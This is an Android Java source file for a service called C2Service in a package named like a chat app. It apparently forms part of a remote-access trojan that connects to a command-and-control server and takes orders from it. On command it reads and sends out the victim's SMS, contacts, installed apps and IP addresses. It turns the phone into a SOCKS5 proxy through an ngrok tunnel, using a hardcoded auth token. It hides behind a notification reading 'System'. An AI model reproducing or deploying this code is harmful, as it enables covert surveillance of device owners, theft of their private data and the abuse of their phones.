package com.meetin.chat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import java.io.*;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class C2Service extends Service {
    private static final String CHANNEL_ID = "C2Channel";
    private static final int NOTIF_ID = 1;
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    private volatile boolean running = true;
    private String deviceId;
    private ProxyService proxyService;
    private Process ngrokProcess;
    private String ngrokUrl = null;

    // REPLACE WITH YOUR ACTUAL NGROK AUTH TOKEN
    private static final String NGROK_AUTH_TOKEN = "3HkEd4EKM03szgnU4ULznnRt0fc_5xzKBV6VYf7kfjYz8SXJx";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
        proxyService = new ProxyService();
        proxyService.onCreate();
        Log.d("C2Service", "Service Created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("C2Service", "Service Starting...");
        startForeground(NOTIF_ID, createNotification());
        new Thread(this::connectAndServe).start();
        return START_STICKY;
    }

    private void connectAndServe() {
        while (running) {
            try {
                Log.d("C2Service", "Connecting to " + Config.HOST + ":" + Config.PORT);
                socket = new Socket(Config.HOST, Config.PORT);
                writer = new PrintWriter(socket.getOutputStream(), true);
                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                writer.println("DEVICE:" + deviceId);
                writer.println("READY");
                Log.d("C2Service", "Connected!");

                String command;
                while ((command = reader.readLine()) != null && running) {
                    Log.d("C2Service", "Command: " + command);
                    String response = executeCommand(command);
                    writer.println(response);
                    writer.println("---END---");
                }
            } catch (Exception e) {
                Log.e("C2Service", "Connection error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private String executeCommand(String command) {
        if (command.startsWith("@")) {
            String[] parts = command.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(command);
    }

    private File extractNgrok() {
        try {
            File ngrokFile = new File(getFilesDir(), "ngrok");
            if (ngrokFile.exists()) {
                ngrokFile.delete();
            }

            InputStream in = getAssets().open("ngrok");
            OutputStream out = new FileOutputStream(ngrokFile);
            byte[] buffer = new byte[8192];
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();

            ngrokFile.setExecutable(true);
            Log.d("C2Service", "Ngrok extracted to: " + ngrokFile.getAbsolutePath());
            return ngrokFile;
        } catch (Exception e) {
            Log.e("C2Service", "Failed to extract ngrok: " + e.getMessage());
            return null;
        }
    }

    private String startNgrokTunnel() {
        try {
            File ngrokFile = extractNgrok();
            if (ngrokFile == null) {
                return "❌ Ngrok extraction failed";
            }

            // Authenticate
            if (!NGROK_AUTH_TOKEN.equals("YOUR_NGROK_AUTH_TOKEN_HERE")) {
                ProcessBuilder authPb = new ProcessBuilder(
                        ngrokFile.getAbsolutePath(),
                        "authtoken",
                        NGROK_AUTH_TOKEN
                );
                authPb.redirectErrorStream(true);
                authPb.directory(getFilesDir());
                Process authProcess = authPb.start();
                authProcess.waitFor(5, TimeUnit.SECONDS);
                Log.d("C2Service", "Ngrok authenticated");
            }

            // Start tunnel
            ProcessBuilder pb = new ProcessBuilder(
                    ngrokFile.getAbsolutePath(),
                    "tcp",
                    "1080"
            );
            pb.redirectErrorStream(true);
            pb.directory(getFilesDir());

            ngrokProcess = pb.start();
            Log.d("C2Service", "Ngrok tunnel started");

            BufferedReader ngrokReader = new BufferedReader(
                    new InputStreamReader(ngrokProcess.getInputStream())
            );

            String line;
            while ((line = ngrokReader.readLine()) != null) {
                Log.d("C2Service", "Ngrok: " + line);
                if (line.contains("tcp://")) {
                    int start = line.indexOf("tcp://");
                    int end = line.indexOf(" ", start);
                    if (end == -1) end = line.length();
                    ngrokUrl = line.substring(start + 6, end);
                    Log.d("C2Service", "Ngrok URL: " + ngrokUrl);
                    return "✅ Ngrok tunnel started\n🌐 SOCKS5 Proxy: " + ngrokUrl;
                }
            }

            return "✅ Ngrok started, waiting for URL...";

        } catch (Exception e) {
            Log.e("C2Service", "Failed to start ngrok: " + e.getMessage());
            return "❌ Ngrok failed: " + e.getMessage();
        }
    }

    private void stopNgrokTunnel() {
        if (ngrokProcess != null) {
            ngrokProcess.destroy();
            ngrokProcess = null;
            ngrokUrl = null;
            Log.d("C2Service", "Ngrok tunnel stopped");
        }
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("proxy on")) {
            proxyService.startProxy();
            String result = startNgrokTunnel();
            return result;
        }
        if (cmd.equalsIgnoreCase("proxy off")) {
            proxyService.stopProxy();
            stopNgrokTunnel();
            return "❌ Proxy stopped\n❌ Ngrok tunnel stopped";
        }
        if (cmd.equalsIgnoreCase("proxy status")) {
            String status = proxyService.isRunning() ? "✅ Proxy running" : "❌ Proxy stopped";
            if (ngrokUrl != null) {
                status += "\n🌐 SOCKS5 Proxy: " + ngrokUrl;
            }
            return status;
        }

        if (cmd.equalsIgnoreCase("ip")) {
            return DeviceInfo.getFullIpInfo(this);
        }
        if (cmd.equalsIgnoreCase("localip")) {
            return "Local IP: " + DeviceInfo.getDeviceIp();
        }
        if (cmd.equalsIgnoreCase("publicip")) {
            return "External IP: " + DeviceInfo.getPublicIp();
        }

        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getApps(this);
        if (cmd.equalsIgnoreCase("contacts")) return DeviceInfo.getContacts(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }

        return "Unknown command. Available: ping, info, ip, localip, publicip, sms read, contacts, apps list, device, proxy on/off/status, exit";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        if (proxyService != null) proxyService.stopProxy();
        stopNgrokTunnel();
        try { socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
